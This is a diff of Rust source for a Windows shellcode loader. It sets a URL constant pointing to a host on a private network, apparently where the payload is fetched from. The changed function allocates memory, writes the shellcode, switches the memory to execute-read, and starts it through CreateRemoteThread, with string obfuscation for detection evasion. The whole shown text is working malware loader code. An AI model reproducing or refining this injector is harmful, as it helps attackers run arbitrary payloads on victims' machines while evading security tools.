@@ -28,20 +28,53 @@ const URL: &str = "http://192.168.1.114:8443/foo";
 
 fn inject(sc: Vec<u8>) {
     unsafe {
-        let pid: u32 = GetCurrentProcessId();
-        let h = OpenProcess(PROCESS_ALL_ACCESS, false, pid).unwrap();
-        let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
-        let mut n = 0;
-        WriteProcessMemory(h, addr, sc.as_ptr() as  _, sc.len(), Some(&mut n));
-        let _h_thread = CreateRemoteThread(
-            h, 
-            None, 
-            0, 
-            Some(std::mem::transmute(addr)), 
-            None,
-            0, 
-            None);
-        CloseHandle(h);
+        let h: HANDLE = GetCurrentProcess();
+            let sc_len = sc.len();
+            
+            println!("Handle: {:?}", h);
+            println!("Allocating {sc_len} bytes of memory...");
+            let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            
+            println!("Writing memory...");
+            let mut n = 0;
+            WriteProcessMemory(h, addr, sc.as_ptr() as  _, sc.len(), Some(&mut n));
+            println!("Wrote {n} bytes");
+
+            println!("Changing mem permissions to RX");
+            let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
+            VirtualProtectEx(
+                h,
+                addr,
+                sc_len,
+                PAGE_EXECUTE_READ,
+                &mut old_protect
+            );
+
+            
+            println!("Creating Thread");
+            let h_thread = CreateRemoteThread(
+                h, 
+                None, 
+                0, 
+                Some(std::mem::transmute(addr)), 
+                None,
+                0, 
+                None
+            )
+            .unwrap();
+            
+            println!("Handle: {:?}", h_thread);
+            
+            CloseHandle(h);
+
+            
+            if WaitForSingleObject(h_thread, INFINITE) == WIN32_ERROR(0) {
+               println!("{}", lc!("Good!"));
+               println!("{}", lc!("Injection completed!"));
+            } else {
+               let error = GetLastError();
+               println!("{:?}", error);
+            }
     }
 }
 
